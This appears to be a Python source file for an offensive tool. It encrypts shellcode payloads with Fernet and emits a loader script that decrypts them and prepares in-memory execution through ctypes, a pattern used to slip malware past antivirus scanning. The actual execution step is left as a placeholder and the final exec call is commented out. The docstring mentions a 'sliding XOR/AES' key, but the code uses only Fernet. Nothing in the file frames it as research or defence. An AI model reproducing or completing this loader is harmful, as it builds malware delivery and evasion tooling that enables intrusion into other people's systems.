import os
import base64
from cryptography.fernet import Fernet
from typing import Any

class ShellcodeEnvelope:
    """
    Encrypts binary payloads with a sliding XOR/AES key for in-memory execution.
    """
    def __init__(self):
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)

    def wrap(self, payload: bytes) -> bytes:
        return self.cipher.encrypt(payload)

    def get_loader(self) -> str:
        key_b64 = base64.b64encode(self.key).decode()
        return f"""
import base64
from cryptography.fernet import Fernet
import ctypes

def execute_in_memory(enc_payload: bytes, key: bytes):
    cipher = Fernet(key)
    decrypted = cipher.decrypt(enc_payload)
    # Memory-only execution logic using ctypes
    addr = ctypes.c_void_p(ctypes.addressof(ctypes.create_string_buffer(decrypted)))
    # ... execution logic ...

# exec(f'execute_in_memory(payload, base64.b64decode("{key_b64}"))')
"""
